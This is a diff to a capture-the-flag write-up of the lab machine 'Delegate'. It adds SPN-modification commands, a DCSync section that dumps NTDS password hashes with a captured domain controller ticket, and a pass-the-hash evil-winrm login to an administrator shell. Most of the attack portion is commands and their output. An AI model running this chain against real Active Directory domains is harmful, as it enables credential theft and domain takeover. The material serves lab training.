@@ -448,10 +448,18 @@ Then, we add this DNS record:
 
 The dns records was sucessfully added. Let's assign a SPN to this record:
 
+⚠️ Note: Important to run the command twice times, with the --aditional flag and without it.
+
 <br />
 
 ```bash
 ❯ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/theredp4nther.delegate.vl' -t 'theredp4nther$' -dc-ip 10.129.234.69 dc1.delegate.vl --additional
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/theredp4nther.delegate.vl' -t 'theredp4nther$' -dc-ip 10.129.234.69 dc1.delegate.vl
 [-] Connecting to host...
 [-] Binding to host
 [+] Bind OK
@@ -522,24 +530,11 @@ COERCE_PLUS 10.129.234.69   445    DC1              Exploit Success, spoolss\Rpc
 
 <br />
 
-The authentication was successfully captured and save into the file: `DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache`
+The ticket was successfully captured and save into the file: `DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache`
 
 <br />
 
 ```bash
-❯ python3 krbrelayx.py -hashes :3374b69aeb0dfab7761b0140d2f3f83b
-[*] Protocol Client HTTPS loaded..
-[*] Protocol Client HTTP loaded..
-[*] Protocol Client LDAP loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client SMB loaded..
-[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
-[*] Running in unconstrained delegation abuse mode using the specified credentials.
-[*] Setting up SMB Server
-[*] Setting up HTTP Server on port 80
-[*] Setting up DNS Server
-
-[*] Servers started, waiting for connections
 [*] SMBD: Received connection from 10.129.234.69
 [*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
 [*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
@@ -548,5 +543,95 @@ The authentication was successfully captured and save into the file: `DC1$@DELEG
 [*] SMBD: Received connection from 10.129.234.69
 [-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
 ```
+
+<br />
+
+## DCSync
+
+<br />
+
+With the TGT of this account we will be able to extract all the hashes from the `ntds` database via a DCSync attack.
+
+To do this we generate the Kerberos conf file and export the ticket:
+
+<br />
+
+```bash
+❯ nxc smb delegate.vl -u 'theredp4nther$' -p Red123, --generate-krb5-file krb5.conf
+SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.69   445    DC1              [+] krb5 conf saved to: krb5.conf
+SMB         10.129.234.69   445    DC1              [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
+SMB         10.129.234.69   445    DC1              [+] delegate.vl\theredp4nther$:Red123, 
+
+export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
+```
+
+<br />
+
+Now we can proceed with the attack:
+
+<br />
+
+```bash
+❯ nxc smb delegate.vl --use-kcache --ntds
+SMB         delegate.vl     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         delegate.vl     445    DC1              [+] DELEGATE.VL\DC1$ from ccache 
+SMB         delegate.vl     445    DC1              [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         delegate.vl     445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         delegate.vl     445    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
+SMB         delegate.vl     445    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         delegate.vl     445    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
+SMB         delegate.vl     445    DC1              A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
+SMB         delegate.vl     445    DC1              b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
+SMB         delegate.vl     445    DC1              R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
+SMB         delegate.vl     445    DC1              J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
+SMB         delegate.vl     445    DC1              N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
+SMB         delegate.vl     445    DC1              DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
+SMB         delegate.vl     445    DC1              theredp4nther$:4601:aad3b435b51404eeaad3b435b51404ee:3374b69aeb0dfab7761b0140d2f3f83b:::
+SMB         delegate.vl     445    DC1              [+] Dumped 10 NTDS hashes to /root/.nxc/logs/ntds/DC1_delegate.vl_2026-01-08_115620.ntds of which 8 were added to the database
+SMB         delegate.vl     445    DC1              [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         delegate.vl     445    DC1              [*] grep -iv disabled /root/.nxc/logs/ntds/DC1_delegate.vl_2026-01-08_115620.ntds | cut -d ':' -f1
+```
+
+<br />
+
+Finally, we connect to the target machine via WinRM using the extracted Administrator NTLM hash:
+
+<br />
+
+```bash
+❯ evil-winrm -i delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+delegate\administrator
+hos*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DC1
+```
+
+<br />
+
+With administrator access, the `root.txt` was successfully obtained:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+bb6a2468453980cb9b83516adexxxxxx
+```
+
+<br />
+
+Machined rooted.
+
+I hope you learned something new and enjoyed the writeup.
+
+Keep Hacking! ❤️❤️
 
 <br />
